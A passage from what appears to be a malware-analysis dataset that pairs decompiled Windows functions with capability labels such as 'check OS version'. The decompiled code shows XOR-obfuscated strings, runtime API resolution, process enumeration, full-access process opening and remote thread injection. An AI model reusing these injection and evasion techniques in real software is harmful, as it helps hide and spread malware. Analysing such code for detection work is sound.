var_1ch;\n            if (*0x41daf8 != 0) {\n                var_4h = 0;\n                uVar1 = (*pcVar6)(0, var_14h);\n                pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n                (*pcVar6)(uVar1);\n                pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n                (*pcVar6)(uVar1);\n                uVar1 = (*pcVar5)(0, iVar3);\n                (*pcVar6)(uVar1);\n                goto code_r0x00402f32;\n            }\n            uVar1 = (*pcVar6)(0, var_14h);\n            pcVar6 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        }\n        (*pcVar6)(uVar1);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n        (*pcVar6)(uVar1);\n        uVar1 = (*pcVar5)(0, iVar3);\n        (*pcVar6)(uVar1);\n    }\n    else {\ncode_r0x00402f32:\n        puVar7 = 0x41dae8;\n        for (iVar2 = 0x18; iVar2 != 0; iVar2 = iVar2 + -1) {\n            *var_28h = *puVar7;\n            puVar7 = puVar7 + 1;\n            var_28h = var_28h + 1;\n        }\n    }\ncode_r0x00402f3f:\n    *0x41dafc = *0x41daf8 >> 0x20;\n    *0x41daf4 = *0x41daf0 >> 0x20;\n    *0x41daec = *0x41dae8 >> 0x20;\n    return var_4h;\n}\n",
        "token_count": 2357
    },
    "00403110": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00403110(int32_t *arg_8h, int32_t lpStartAddress, int32_t lpParameter, uint32_t arg_14h)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int16_t *piVar6;\n    uint *puVar7;\n    code *pcVar8;\n    int16_t *piVar9;\n    uint uVar10;\n    int32_t iVar11;\n    int32_t *piVar12;\n    uint unaff_EDI;\n    int64_t iVar13;\n    uint uVar14;\n    int32_t iVar15;\n    uchar *puVar16;\n    int32_t iVar17;\n    int32_t *piStack140;\n    int32_t iVar18;\n    uint uStack124;\n    uchar *puStack120;\n    int32_t iStack116;\n    uint uStack112;\n    uchar auStack108 [4];\n    int32_t iStack104;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    ushort uStack84;\n    uchar uStack82;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    int32_t aiStack56 [2];\n    ushort uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    piStack140 = 0x403122;\n    cVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n    uStack100 = NULL;\n    piVar12 = arg_8h + 1;\n    uStack112 = piVar12;\n    if (*piVar12 != 0) {\n        piStack140 = *piVar12;\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        *piVar12 = 0;\n    }\n    uVar10 = 0xffffffff;\n    if (((arg_14h & 0x10) == 0) && ((*0x41dac8 & 1) != 0)) {\n        puStack120 = 0x5;\n        iVar13 = CONCAT44(5, iStack116);\n        if (cVar2 != '\\x05') {\n            if ((*0x41e1d8 | *0x41e1dc) == 0) {\n                piStack140 = 0xb;\n                iVar17 = 8;\n                uStack72 = 0xf0c2326;\n                uStack68 = 0x433661e;\n                uStack64 = CONCAT22(uStack64._2_2_, 0x720f);\n                uStack80 = 0x63685748;\n                uStack76 = CONCAT31(uStack76._1_3_, 0x72);\n                uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n                iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n                iVar3 = 0;\n                uStack100 = &stack0xffffffac + -iVar18;\n                iStack104 = iVar18;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_GetMessageTime)();\n                    if (iVar4 != 0xc1c0d5) {\n                        *(iVar3 + iVar18) = (&stack0xffffffa4)[iVar3 % 5] ^ (iVar3 + iVar18)[uStack100];\n                    }\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < 10);\n                uStack44 = 0x295e4d61;\n                uStack40 = 0x46585604;\n                uStack36 = 0x5c40230f;\n                uStack32 = 0x411e3e40;\n                uStack28 = 0x760e535c;\n                uStack92 = 0x6a323933;\n                uStack88 = CONCAT31(uStack88._1_3_, 0x76);\n                uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n                iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n                iVar3 = 0;\n                uStack112 = &stack0xffffffc8 + -iVar18;\n                uVar10 = 0xffffffff;\n                do {\n                    iVar4 = (*_sym.imp.USER32.dll_CloseClipboard)();\n                    if (iVar4 != 0x659b39) {\n                        *(iVar3 + iVar18) = (&stack0xffffff98)[iVar3 % iVar17] ^ *(uStack112 + iVar3 + iVar18);\n                    }\n                    iVar3 = iVar3 + 1;\n                } while (iVar3 < 0x14);\n                fcn.0040935f();\n                *0x41e1d8 = fcn.00409867(iVar18);\n                uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar18);\n                pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n                uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iStack116);\n                (*pcVar8)(uVar14);\n                *0x41e1d0 = CONCAT44(*0x41e1d4, *0x41e1d0);\n                if (*0x41e1d8 == 0) goto code_r0x0040391c;\n            }\n            *0x41e1dc = *0x41e1d8 >> 0x20;\n            uVar10 = 0xffffffff;\n            piStack140 = &stack0xffffffb8 >> 0x1f;\n            iVar18 = fcn.004105c0(*0x41e1d8, *0x41e1dc, 10, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, 0, 0, 0, 0);\n            *0x41e1d0 = CONCAT44(*0x41e1d4, *0x41e1d0);\n            if (-1 < iVar18) {\n                uVar10 = 0;\n                *0x41e1d0 = CONCAT44(*0x41e1d4, *0x41e1d0);\n            }\n            goto code_r0x0040391c;\n        }\n        if ((*0x41e1d0 | *0x41e1d4) == 0) {\n            piStack140 = 0x40318c;\n            fcn.0040935f();\n            pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            piStack140 = 0xb;\n            iVar17 = 8;\n            uStack72 = 0xf0c2326;\n            uStack68 = 0x433661e;\n            uStack64 = CONCAT22(uStack64._2_2_, 0x720f);\n            uStack88 = 0x63685748;\n            uStack84 = CONCAT11(uStack84._1_1_, 0x72);\n            uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n            iVar18 = 0;\n            puStack120 = &stack0xffffffac + -iVar3;\n            iStack116 = iVar3;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetMessageTime)();\n                if (iVar4 != 0xc1c0d5) {\n                    *(iVar18 + iVar3) = (&stack0xffffff9c)[iVar18 % 5] ^ (iVar18 + iVar3)[puStack120];\n                }\n                iVar18 = iVar18 + 1;\n            } while (iVar18 < 10);\n            iVar15 = 8;\n            uStack68 = 0x25145325;\n            uStack64 = 0x2253083d;\n            uStack60 = uStack60 & 0xff000000 | 0x693e05;\n            uStack100 = 0x69663769;\n            uStack96 = CONCAT31(uStack96._1_3_, 0x52);\n            uVar10 = (*pcVar8)(8, 0xc);\n            iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n            iVar11 = 0;\n            piStack140 = &stack0xffffffb0 + -iVar3;\n            uVar10 = 0xffffffff;\n            iVar4 = iVar3;\n            do {\n                iVar5 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n                if (iVar5 != 0x542243) {\n                    *(iVar11 + iVar3) = (&stack0xffffff90)[iVar11 % iVar17] ^ (iVar11 + iVar3)[piStack140];\n                }\n                iVar11 = iVar11 + 1;\n            } while (iVar11 < 0xb);\n            iVar11 = iVar18;\n            iVar13 = fcn.00409867(iVar3);\n            if (iVar13 != 0) {\n                uVar14 = 8;\n                uStack80 = 0x75156b1d;\n                uStack76 = 0x70057604;\n                uStack72 = 0x6b1a7610;\n                uStack68 = 0x76177512;\n                uStack64 = 0x76107018;\n                uStack60 = CONCAT22(uStack60._2_2_, 0x6b76);\n                iStack104 = 0x75706b76;\n                uStack100 = CONCAT31(uStack100._1_3_, 0x76);\n                uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x2d);\n                puStack120 = iVar13 >> 0x20;\n                iStack116 = iVar13;\n                piVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n                puStack120 = iVar13 >> 0x20;\n                iStack116 = iVar13;\n                iVar5 = 0;\n                iVar3 = iVar17;\n                iVar18 = iVar11;\n                uStack124 = piVar6;\n                do {\n                    iVar17 = (*_sym.imp.USER32.dll_GetMenuCheckMarkDimensions)();\n                    puStack120 = iVar13 >> 0x20;\n                    iStack116 = iVar13;\n                    if (iVar17 != 0xcc786f) {\n                        *(iVar5 + piVar6) =\n                             (&stack0xffffff8c)[iVar5 % iVar15] ^ (iVar5 + piVar6)[&stack0xffffffa4 + -piVar6];\n                    }\n                    iVar5 = iVar5 + 1;\n                } while (iVar5 < 0x16);\n                aiStack56[0] = piVar6 >> 0x1f;\n                piVar9 = piVar6;\n                do {\n                    iVar1 = *piVar9;\n                    piVar9 = piVar9 + 1;\n                } while (iVar1 != unaff_EDI);\n                iVar1 = (piVar9 - (piVar6 + 1) >> 1) * 2;\n                uStack64 = 0;\n                uStack68 = CONCAT22(iVar1 + 2, iVar1);\n                uStack60 = piVar6;\n                iVar17 = fcn.004105c0(iVar18, iVar4, 4, 0, 0, 0, 0, 0, &stack0xffffffbc, &stack0xffffffbc >> 0x1f, \n                                      &stack0xffffff94, &stack0xffffff94 >> 0x1f, uVar10, uVar14);\n                pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                puStack120 = iVar13 >> 0x20;\n                iStack116 = iVar13;\n                if (iVar17 < 0) {\n                    uVar10 = fcn.0040b198();\n                    puStack120 = iVar13 >> 0x20;\n                    iStack116 = iVar13;\n                }\n                else {\n                    iVar4 = 8;\n                    uStack92 = 0x56020903;\n                    uStack88 = 0x110e041c;\n                    uStack84 = 0x1c4b;\n                    uStack82 = 0x68;\n                    iStack116 = 0x38706c68;\n                    uStack112 = CONCAT31(uStack112._1_3_, 0x79);\n                    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xc);\n                    iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n                    iVar17 = 0;\n                    piStack140 = &stack0xffffff98 + -iVar18;\n                    iVar3 = iVar18;\n                    do {\n                        iVar11 = (*_sym.imp.USER32.dll_GetInputState)();\n                        if (iVar11 != 0x6b07f2) {\n                            *(iVar17 + iVar18) = (&stack0xffffff80)[iVar17 % 5] ^ (iVar17 + iVar18)[piStack140];\n                        }\n                        iVar17 = iVar17 + 1;\n                    } while (iVar17 < 0xb);\n                    iStack104 = 0x37120a35;\n                    uStack100 = 0x122a1332;\n                    uStack96 = 0x1d02293b;\n                    uStack92 = 0x13343e23;\n                    uStack88 = uStack88 & 0xff000000 | 0x561319;\n                    iVar18 = 0x56777876;\n                    uStack124 = CONCAT31(uStack124._1_3_, 0x46);\n                    uVar10 = (*pcVar8)(8, 0x14);\n                    iVar17 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n                    iVar11 = 0;\n                    puVar16 = &stack0xffffff8c + -iVar17;\n                    uVar10 = 0xffffffff;\n                    do {\n                        iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                        if (iVar5 != 0xfc2d8e) {\n                            *(iVar11 + iVar17) = (&stack0xffffff74)[iVar11 % iVar4] ^ (iVar11 + iVar17)[puVar16];\n                        }\n                        iVar11 = iVar11 + 1;\n                    } while (iVar11 < 0x13);\n                    *0x41e1d0 = fcn.00409867(iVar17);\n                    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n                    uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar17);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n                    uVar14 = (*pcVar8)(0, iVar15);\n                    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n                    iVar13 = CONCAT44(puStack120, iStack116);\n                    piVar6 = uStack124;\n                }\n                uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, piVar6);\n                puStack120 = iVar13 >> 0x20;\n                iStack116 = iVar13;\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n                puStack120 = iVar13 >> 0x20;\n                iStack116 = iVar13;\n            }\n            pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n            puStack120 = iVar13 >> 0x20;\n            iStack116 = iVar13;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n            puStack120 = iVar13 >> 0x20;\n            iStack116 = iVar13;\n            uVar14 = (*pcVar8)(0, iVar18);\n            puStack120 = iVar13 >> 0x20;\n            iStack116 = iVar13;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n            puStack120 = iVar13 >> 0x20;\n            iStack116 = iVar13;\n            piVar12 = uStack112;\n            if (*0x41e1d0 == 0) goto code_r0x0040391c;\n        }\n        *0x41e1d4 = *0x41e1d0 >> 0x20;\n        piStack140 = arg_8h + 3 >> 0x1f;\n        iVar18 = fcn.004105c0(*0x41e1d0, *0x41e1d4, 7, 0, *arg_8h, *arg_8h >> 0x1f, 0, 0, 0, 0, lpStartAddress, \n                              lpStartAddress >> 0x1f, lpParameter, lpParameter >> 0x1f);\n        puStack120 = iVar13 >> 0x20;\n        iStack116 = iVar13;\n        *piVar12 = iVar18;\n        if (iVar18 == 0) goto code_r0x0040391c;\n    }\n    else {\n        puStack120 = 0x5;\n        if (cVar2 != '\\x05') {\n            piStack140 = 0xb;\n            iVar17 = 8;\n            aiStack56[0] = 0xf0c2326;\n            aiStack56[1] = 0x433661e;\n            uStack48 = 0x720f;\n            uStack80 = 0x63685748;\n            uStack76 = CONCAT31(uStack76._1_3_, 0x72);\n            puVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n            iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)();\n            iVar3 = 0;\n            uStack100 = &stack0xffffffbc + -iVar18;\n            iStack104 = iVar18;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_GetMessageTime)();\n                if (iVar4 != 0xc1c0d5) {\n                    *(iVar3 + iVar18) = (&stack0xffffffa4)[iVar3 % 5] ^ (iVar3 + iVar18)[uStack100];\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 10);\n            uStack44 = 0x295e4d61;\n            uStack40 = 0x46585604;\n            uStack36 = 0x5c40230f;\n            uStack32 = 0x411e3e40;\n            uStack28 = 0x760e535c;\n            uStack92 = 0x6a323933;\n            uStack88 = CONCAT31(uStack88._1_3_, 0x76);\n            uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x15);\n            iVar18 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n            iVar3 = 0;\n            uStack112 = &stack0xffffffc8 + -iVar18;\n            uVar10 = 0xffffffff;\n            do {\n                iVar4 = (*_sym.imp.USER32.dll_CloseClipboard)();\n                if (iVar4 != 0x659b39) {\n                    *(iVar3 + iVar18) = (&stack0xffffff98)[iVar3 % iVar17] ^ (iVar3 + iVar18)[uStack112];\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < 0x14);\n            uVar14 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iStack116, iVar18);\n            pcVar8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar14);\n            if (pcVar8 != NULL) {\n                iVar3 = (*pcVar8)(*arg_8h, 0, 0, 0, 0, 0, lpStartAddress, lpParameter, puVar7, &stack0xffffff94);\n                if (iVar3 < 0) {\n                    uVar10 = fcn.0040b198();\n                }\n                else {\n                    uStack124 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*puVar7, 30000);\n                    if (uStack124 == NULL) {\n                        (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*puVar7, &stack0xffffff84);\n                    }\n                    uVar10 = 0;\n                }\n            }\n            uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar18);\n            pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar14);\n            uVar14 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iStack116);\n            (*pcVar8)(uVar14);\n            goto code_r0x0040391c;\n        }\n        piStack140 = arg_8h + 3;\n        iVar18 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)(*arg_8h, 0, 0, lpStartAddress, lpParameter, 0);\n        *piVar12 = iVar18;\n        if (iVar18 == 0) {\n            uVar10 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            goto code_r0x0040391c;\n        }\n        uStack124 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(iVar18, 30000);\n        if (uStack124 == NULL) {\n            (*_sym.imp.KERNEL32.dll_GetExitCodeThread)(*piVar12, &stack0xffffff84);\n        }\n    }\n    uVar10 = 0;\ncode_r0x0040391c:\n    *0x41e1dc = *0x41e1d8 >> 0x20;\n    *0x41e1d4 = *0x41e1d0 >> 0x20;\n    return uVar10;\n}\n",
        "token_count": 4906
    },
    "004053db": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.004053db(code *param_1, uint param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    uint uVar8;\n    uint uVar9;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    int32_t *lpLibFileName;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0xffffffff;\n    var_8h = 5;\n    var_20h = param_1;\n    var_1ch = param_2;\n    if (*0x41db04 == NULL) {\n        var_2ch = 0xf0c2326;\n        var_28h = 0x433661e;\n        var_24h._0_2_ = 0x720f;\n        var_14h = 0x63685748;\n        var_10h._0_1_ = 0x72;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar10 = 0;\n        lpLibFileName = iVar4;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetMessageTime)();\n            if (iVar5 != 0xc1c0d5) {\n                *(iVar10 + iVar4) = *(&var_14h + iVar10 % var_8h) ^ (iVar10 + iVar4)[&var_2ch - iVar4];\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 10);\n        var_48h = 0x3c3c3129;\n        var_44h = 0x3e3c1531;\n        var_40h = 0x20132730;\n        var_3ch = 0x13a0000;\n        var_38h = 0x35241f2a;\n        var_34h = 0x27022c13;\n        var_30h._0_1_ = 0x54;\n        var_28h = 0x496d4567;\n        var_24h._0_2_ = CONCAT11(var_24h._1_1_, 0x54);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1a);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar10 = 0;\n        var_14h = &var_48h - iVar4;\n        do {\n            iVar6 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            iVar5 = lpLibFileName;\n            if (iVar6 != 0x73242) {\n                *(iVar10 + iVar4) = *(&var_28h + iVar10 % var_8h) ^ (iVar10 + iVar4)[&var_48h - iVar4];\n            }\n            iVar10 = iVar10 + 1;\n        } while (iVar10 < 0x19);\n        uVar3 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar4);\n        *0x41db04 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n    }\n    var_4h = 0;\n    iVar4 = (**0x41db04)(5, 0, 0, &var_4h);\n    if (iVar4 == -0x3ffffffc) {\n        var_4h = var_4h + 0x100;\n        piVar7 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n        if (piVar7 != NULL) {\n            lpLibFileName = piVar7;\n            iVar4 = (**0x41db04)(5, piVar7, var_4h, 0);\n            uVar3 = var_1ch;\n            if (-1 < iVar4) {\n                var_ch = 0;\n                piVar11 = piVar7;\n                do {\n                    iVar4 = piVar11[0x11];\n                    if (((iVar4 != 0) && (iVar4 != 4)) && (iVar4 != *0x41daa0)) {\n                        uVar8 = fcn.00408747();\n                        uVar9 = fcn.004012fd();\n                        iVar4 = (*var_20h)(piVar11[0xf], uVar9, piVar11[0x11], piVar11[0x12], uVar8, uVar3);\n                        piVar7 = lpLibFileName;\n                        if (iVar4 == 0) break;\n                    }\n                    piVar7 = lpLibFileName;\n                    if (*piVar11 == 0) break;\n                    piVar11 = piVar11 + *piVar11;\n                } while( true );\n            }\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(piVar7, 0, 0x8000);\n        }\n    }\n    return var_ch;\n}\n",
        "token_count": 1374
    },
    "00408b3a": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00408b3a(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    uint uVar6;\n    int32_t iVar7;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t lpModuleName;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_24h._0_1_ = 0x26;\n    var_24h._1_1_ = 0x23;\n    var_24h._2_2_ = 0xf0c;\n    var_20h._0_2_ = 0x661e;\n    var_20h._2_2_ = 0x433;\n    var_1ch._0_2_ = 0x720f;\n    var_18h = 0x63685748;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x72);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_24h - iVar2;\n    lpModuleName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar3 != 0xc1c0d5) {\n            var_4h = 5;\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % 5) ^ (iVar7 + iVar2)[var_8h];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 10);\n    var_28h = 0x39071f2a;\n    var_24h._0_1_ = 0x2b;\n    var_4h = 6;\n    var_24h._1_1_ = 6;\n    var_24h._2_2_ = 0x1a20;\n    var_20h._0_2_ = 0x2a27;\n    var_20h._2_2_ = 0x1b2b;\n    var_1ch._0_2_ = 0x6803;\n    var_18h = 0x49486870;\n    var_14h._0_2_ = 0x684e;\n    uVar1 = (*pcVar5)(8, 0xf);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar7 = 0;\n    var_8h = &var_28h - iVar2;\n    do {\n        iVar4 = (*_sym.imp.USER32.dll_GetClipboardOwner)();\n        iVar3 = lpModuleName;\n        if (iVar4 != 0x50bb7b) {\n            *(iVar7 + iVar2) = *(&var_18h + iVar7 % var_4h) ^ (iVar7 + iVar2)[&var_28h - iVar2];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0xe);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, iVar2);\n    uVar1 = (*pcVar5)(var_10h, 0x1f0fff, arg_8h, arg_ch);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar2);\n    pcVar5 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar6);\n    uVar6 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar5)(uVar6);\n    return uVar1;\n}\n",
        "token_count": 970
    },
    "0040935f": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.0040935f(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    code *pcVar7;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint32_t var_38h;\n    uchar var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_ch = 0;\n    if ((*0x41dd28 | *0x41dd2c) != 0) {\ncode_r0x00409718:\n        var_ch = 0x41dd28;\n        goto code_r0x0040971d;\n    }\n    var_30h = 0xf0c2326;\n    var_2ch = 0x433661e;\n    var_28h._0_2_ = 0x720f;\n    var_24h = 0x63685748;\n    var_20h._0_1_ = 0x72;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_18h = 5;\n    iVar6 = 0;\n    var_1ch = &var_30h - iVar2;\n    var_8h = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetMessageTime)();\n        if (iVar3 != 0xc1c0d5) {\n            *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_18h) ^ (iVar6 + iVar2)[var_1ch];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 10);\n    var_48h = 0xa263003;\n    var_44h = 0x2936744d;\n    var_40h = 0x43410a15;\n    var_3ch = 0xa132f0d;\n    var_38h = var_38h & 0xff000000 | 0x595358;\n    var_2ch = 0x6f614759;\n    var_28h._0_2_ = 0x3739;\n    uVar1 = (*pcVar5)(8, 0x14);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_1ch = 6;\n    iVar6 = 0;\n    var_10h = &var_48h - iVar2;\n    var_14h = iVar2;\n    do {\n        iVar4 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        iVar3 = var_8h;\n        if (iVar4 != 0xa59f38) {\n            *(iVar6 + iVar2) = *(&var_2ch + iVar6 % var_1ch) ^ (iVar6 + iVar2)[var_10h];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 0x13);\n    *0x41dd28 = fcn.00409867(iVar2);\n    if (*0x41dd28 == 0) {\n        uVar1 = (*pcVar5)(0, iVar2);\n        pcVar7 = _sym.imp.KERNEL32.dll_HeapFree;\ncode_r0x00409493:\n        (*pcVar7)(uVar1);\n        uVar1 = (*pcVar5)(0, iVar3);\n        (*pcVar7)(uVar1);\n    }\n    else {\n        var_48h = 0x3073234;\n        var_44h = 0x3a2a2d3e;\n        var_40h = 0x31162f12;\n        var_3ch = 0xb380e00;\n        var_38h = var_38h & 0xff000000 | 0x663024;\n        var_24h = 0x6654456e;\n        var_20h._0_1_ = 0x4a;\n        uVar1 = (*pcVar5)(8, 0x14);\n        iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar6 = 0;\n        var_10h = &var_48h - iVar2;\n        var_4h = iVar2;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_DestroyCaret)();\n            iVar3 = var_8h;\n            if (iVar4 != 0xb514d4) {\n                *(iVar6 + iVar2) = *(&var_24h + iVar6 % var_18h) ^ (iVar6 + iVar2)[var_10h];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x13);\n        *0x41dd30 = fcn.00409867(iVar2);\n        iVar2 = var_14h;\n        if 